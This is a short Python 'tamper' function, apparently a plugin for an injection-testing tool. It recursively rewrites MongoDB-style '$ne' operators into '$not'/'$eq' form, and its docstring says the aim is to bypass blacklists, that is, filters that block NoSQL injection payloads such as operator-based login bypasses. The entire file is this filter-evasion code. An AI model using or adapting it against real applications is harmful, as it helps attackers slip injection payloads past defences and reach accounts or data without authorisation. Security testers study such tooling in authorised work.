import json

def tamper(payload):
    """
    Inverts logical operators to bypass blacklists.
    Example: {"$ne": "admin"} -> {"$not": {"$eq": "admin"}}
    """
    if not isinstance(payload, dict):
        return json.dumps(payload)

    new_payload = {}
    
    for key, value in payload.items():
        if key == "$ne":
            new_payload["$not"] = {"$eq": value}
        elif isinstance(value, dict):
            new_payload[key] = json.loads(tamper(value))
        else:
            new_payload[key] = value
            
    return json.dumps(new_payload)